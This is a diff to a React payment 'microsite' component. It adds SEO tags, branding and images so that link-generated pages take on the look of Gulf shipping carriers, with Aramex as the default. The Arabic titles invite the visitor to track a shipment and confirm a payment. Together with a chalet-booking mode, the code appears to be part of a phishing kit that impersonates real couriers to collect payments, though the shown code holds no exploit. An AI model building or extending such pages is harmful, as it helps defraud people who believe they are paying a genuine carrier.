@@ -4,6 +4,9 @@ import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode, formatCurrency } from "@/lib/countries";
+import { getServiceBranding } from "@/lib/serviceLogos";
+import { gccShippingServices } from "@/lib/gccShippingServices";
+import SEOHead from "@/components/SEOHead";
 import {
   MapPin,
   Users,
@@ -11,6 +14,8 @@ import {
   CreditCard,
   Shield,
   Sparkles,
+  Package,
+  Truck,
 } from "lucide-react";
 
 const Microsite = () => {
@@ -40,8 +45,43 @@ const Microsite = () => {
   
   const payload = link.payload;
   
+  // Get service branding for SEO and display
+  const serviceName = payload.service_name || payload.chalet_name;
+  const serviceKey = payload.service_key || 'aramex';
+  const serviceBranding = getServiceBranding(serviceKey);
+  
+  // Get service description from gccShippingServices
+  const allServices = Object.values(gccShippingServices).flat();
+  const serviceData = allServices.find(s => s.key === serviceKey);
+  const serviceDescription = serviceData?.description || `خدمة ${serviceName} - نظام دفع آمن ومحمي`;
+  
+  // Determine if it's a shipping or chalet link
+  const isShipping = link.type === 'shipping';
+  const displayName = isShipping 
+    ? `شحنة ${serviceName}` 
+    : payload.chalet_name;
+  
+  // SEO metadata
+  const seoTitle = isShipping 
+    ? `تتبع وتأكيد الدفع - ${serviceName}` 
+    : `حجز شاليه - ${payload.chalet_name}`;
+  const seoDescription = isShipping
+    ? `${serviceDescription} - تتبع شحنتك وأكمل الدفع بشكل آمن`
+    : `احجز ${payload.chalet_name} في ${countryData.nameAr} - ${payload.nights} ليلة لـ ${payload.guest_count} ضيف`;
+  const seoImage = serviceBranding.ogImage || serviceBranding.heroImage || '/og-aramex.jpg';
+  
   return (
-    <div className="min-h-screen py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
+    <>
+      <SEOHead 
+        title={seoTitle}
+        description={seoDescription}
+        image={seoImage}
+        url={window.location.href}
+        type="website"
+        serviceName={serviceName}
+        serviceDescription={serviceDescription}
+      />
+      <div className="min-h-screen py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
       <div className="container mx-auto px-4">
         <div className="max-w-4xl mx-auto">
           {/* Header Badge */}
@@ -70,10 +110,35 @@ const Microsite = () => {
             
             {/* Content */}
             <div className="p-8">
-              {/* Chalet Image Placeholder */}
-              <div className="aspect-video bg-gradient-card rounded-xl mb-6 flex items-center justify-center">
-                <Sparkles className="w-16 h-16 text-muted-foreground" />
-              </div>
+              {/* Service/Chalet Image */}
+              {isShipping && serviceBranding.heroImage ? (
+                <div className="aspect-video rounded-xl mb-6 overflow-hidden">
+                  <img 
+                    src={serviceBranding.heroImage} 
+                    alt={serviceName}
+                    className="w-full h-full object-cover"
+                  />
+                </div>
+              ) : (
+                <div className="aspect-video bg-gradient-card rounded-xl mb-6 flex items-center justify-center">
+                  {isShipping ? (
+                    <Truck className="w-16 h-16 text-muted-foreground" />
+                  ) : (
+                    <Sparkles className="w-16 h-16 text-muted-foreground" />
+                  )}
+                </div>
+              )}
+              
+              {/* Service Info for Shipping */}
+              {isShipping && (
+                <div className="mb-6 p-4 bg-secondary/20 rounded-lg border">
+                  <div className="flex items-center gap-3 mb-2">
+                    <Package className="w-5 h-5 text-primary" />
+                    <h3 className="font-bold text-lg">{serviceName}</h3>
+                  </div>
+                  <p className="text-sm text-muted-foreground">{serviceDescription}</p>
+                </div>
+              )}
               
               {/* Details Grid */}
               <div className="grid md:grid-cols-2 gap-6 mb-8">
@@ -158,6 +223,7 @@ const Microsite = () => {
         </div>
       </div>
     </div>
+    </>
   );
 };
 
